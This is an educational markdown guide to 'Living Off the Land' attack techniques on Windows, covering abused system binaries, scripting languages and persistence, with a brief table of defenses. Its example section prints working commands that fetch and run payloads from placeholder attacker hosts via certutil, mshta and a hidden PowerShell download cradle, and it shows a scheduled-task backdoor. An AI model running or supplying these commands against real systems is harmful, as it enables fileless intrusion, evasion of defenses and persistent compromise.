**Living Off the Land (LotL)**

---

````markdown
# 🧬 Living Off the Land (LotL) Techniques in Offensive Security

> **Disclaimer:** This guide is for **educational**, **research**, and **authorized penetration testing** only. Using these techniques without explicit consent is illegal and unethical.

---

## 📚 Table of Contents

1. [What is Living Off the Land?](#1-what-is-living-off-the-land)
2. [Benefits for Attackers](#2-benefits-for-attackers)
3. [Common LotL Binaries (LOLBins)](#3-common-lotl-binaries-lolbins)
4. [LotL Scripting Languages](#4-lotl-scripting-languages)
5. [LotL Abuse Examples](#5-lotl-abuse-examples)
6. [Persistence via LotL](#6-persistence-via-lotl)
7. [Defensive Strategies](#7-defensive-strategies)

---

## 1. 🧠 What is Living Off the Land?

**LotL** refers to abusing legitimate, signed Windows binaries, tools, or features already present on the system to carry out malicious activities — **without dropping custom binaries**.

---

## 2. 🎯 Benefits for Attackers

- No need to write files to disk (fileless)
- Bypasses application whitelisting
- Trusted, signed by Microsoft
- Reduces visibility in AV/EDR logs
- Exploits sysadmin tools and behaviors

---

## 3. 🛠️ Common LotL Binaries (LOLBins)

| Binary         | Abuse Scenario                          |
|----------------|------------------------------------------|
| `powershell.exe` | Fileless payload execution             |
| `cmd.exe`         | Shell commands                        |
| `regsvr32.exe`    | Execute scripts from URLs             |
| `mshta.exe`       | Run malicious HTML/JS payloads        |
| `rundll32.exe`    | Load and run DLLs                     |
| `wmic.exe`        | Remote WMI execution                  |
| `certutil.exe`    | Downloading files from the internet   |
| `bitsadmin.exe`   | Covert downloads, scheduled tasks     |
| `schtasks.exe`    | Persistence and lateral movement      |
| `reg.exe`         | Registry manipulation                 |

---

## 4. 🧾 LotL Scripting Languages

| Language        | Abuse Examples                           |
|-----------------|-------------------------------------------|
| PowerShell      | Download & execute payloads, AMSI bypass  |
| JavaScript (WScript) | Initial access, phishing payloads    |
| VBScript        | Used in `.hta` files, legacy support     |
| Batch/Command   | Chaining commands, execution flow control |

---

## 5. 🔥 LotL Abuse Examples

### 📥 Download File via `certutil`:
```cmd
certutil -urlcache -split -f http://attacker/file.exe file.exe
````

### 🧬 Execute Remote Script via `mshta`:

```cmd
mshta http://attacker.com/payload.hta
```

### 🧠 Run PowerShell Payload In-Memory:

```powershell
powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"
```

### 🧬 DLL Execution with `rundll32`:

```cmd
rundll32.exe payload.dll,EntryPoint
```

### 🧠 Scheduled Task for Persistence:

```cmd
schtasks /create /tn "Update" /tr "powershell -File backdoor.ps1" /sc minute /mo 15
```

---

## 6. 🔁 Persistence via LotL

* `schtasks.exe` for scheduled task creation
* Registry keys:
  `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`
* `wmic` and `powershell` for event-based triggers
* `WMI` permanent event subscriptions

---

## 7. 🛡️ Defensive Strategies

| Strategy                       | Description                                                        |
| ------------------------------ | ------------------------------------------------------------------ |
| Enable AppLocker / WDAC        | Restrict use of LOLBins                                            |
| Monitor command-line logging   | Audit usage of suspicious binaries                                 |
| Log child process spawning     | Watch for parent-child anomalies (e.g., mshta spawning PowerShell) |
| Use Sysmon and ETW sensors     | Detect script execution, network access                            |
| Alert on uncommon LOLBin usage | Track rare system binary executions                                |
